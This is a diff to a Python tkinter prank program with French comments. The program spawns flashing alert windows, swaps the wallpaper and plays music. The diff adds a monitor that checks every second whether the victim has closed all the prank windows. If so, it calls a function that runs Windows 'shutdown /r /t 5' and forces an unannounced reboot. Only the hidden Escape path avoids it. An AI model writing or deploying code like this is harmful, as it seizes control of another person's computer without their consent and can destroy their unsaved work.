@@ -116,6 +116,9 @@ root.withdraw()  # on cache la fenêtre principale
 
 open_windows = []
 spawning = {"active": False}
+# Permettre / bloquer le redémarrage automatique lorsque toutes les fenêtres sont fermées
+allow_restart = True
+restarting = {"active": False}
 
 # ---- Fonctions ----
 def make_prank_window(idx):
@@ -144,6 +147,12 @@ def make_prank_window(idx):
             pass
         w.destroy()
 
+    # Assurer que la fermeture via le bouton "X" passe par close_this()
+    try:
+        w.protocol("WM_DELETE_WINDOW", close_this)
+    except Exception:
+        pass
+
 
     def clignoter():
         if not getattr(w, "alive", True):
@@ -156,7 +165,13 @@ def make_prank_window(idx):
         try:
             w.configure(bg=bg)
             msg.configure(bg=bg, fg=fg)
-            btn.configure(bg=bbg, fg=bfg)
+            # 'btn' n'existe pas toujours; récupérer depuis locals() sans référencer
+            _btn = locals().get('btn')
+            if _btn is not None:
+                try:
+                    _btn.configure(bg=bbg, fg=bfg)
+                except Exception:
+                    pass
         except Exception:
             pass
         w.after(450, clignoter)
@@ -245,6 +260,10 @@ image_path = resource_path("prank.jpg")  # ou prank.bmp si tu utilises BMP
 threading.Thread(target=changer_fond_decran, args=(image_path,), daemon=True).start()
 
 def stop_all():
+    # Lorsque l'on ferme volontairement toutes les fenêtres (Escape / on_close),
+    # on ne veut pas déclencher le redémarrage automatique.
+    global allow_restart
+    allow_restart = False
     spawning["active"] = False
     try:
         stop_music()
@@ -257,6 +276,50 @@ def stop_all():
         except Exception:
             pass
     open_windows.clear()
+
+
+def restart_pc(delay_seconds: int = 5):
+    """
+    Redémarre la machine Windows après un court délai (par défaut 5s).
+    Utilise la commande `shutdown`.
+    """
+    if restarting.get("active"):
+        return
+    restarting["active"] = True
+    try:
+        # Stopper la musique proprement
+        try:
+            stop_music()
+        except Exception:
+            pass
+        # Lancer le shutdown. /r = restart, /t = timeout en secondes
+        subprocess.Popen(["shutdown", "/r", "/t", str(delay_seconds)])
+    except Exception as e:
+        print("Impossible de lancer le redémarrage:", e, file=sys.stderr)
+
+
+def monitor_windows(interval_ms: int = 1000):
+    """Vérifie périodiquement la liste open_windows et déclenche restart_pc()
+    lorsque toutes les fenêtres ont été fermées par l'utilisateur (et que
+    stop_all() n'a pas demandé d'empêcher le reboot).
+    """
+    try:
+        # Si le redémarrage a été explicitement bloqué ou déjà démarré, rien à faire
+        if not allow_restart or restarting.get("active"):
+            return
+        # Si aucune fenêtre d'alerte n'est ouverte et qu'on n'est pas en train
+        # de spawner, on redémarre
+        if len(open_windows) == 0 and not spawning.get("active"):
+            # Petit délai avant reboot (utilise 5s par défaut)
+            restart_pc(delay_seconds=5)
+            return
+    finally:
+        # Replanifier la surveillance si l'application est toujours active
+        try:
+            if root.winfo_exists() and not restarting.get("active"):
+                root.after(interval_ms, monitor_windows)
+        except Exception:
+            pass
 
 def on_close():
     stop_all()
@@ -287,5 +350,10 @@ threading.Thread(target=changer_fond_decran, args=(image_path,), daemon=True).st
 # --- Lancer directement les fenêtres au démarrage ---
 spawn_windows()
 
+# Démarrer le monitor qui lancera le redémarrage si toutes les fenêtres sont fermées
+try:
+    root.after(1000, monitor_windows)
+except Exception:
+    pass
 
 root.mainloop()
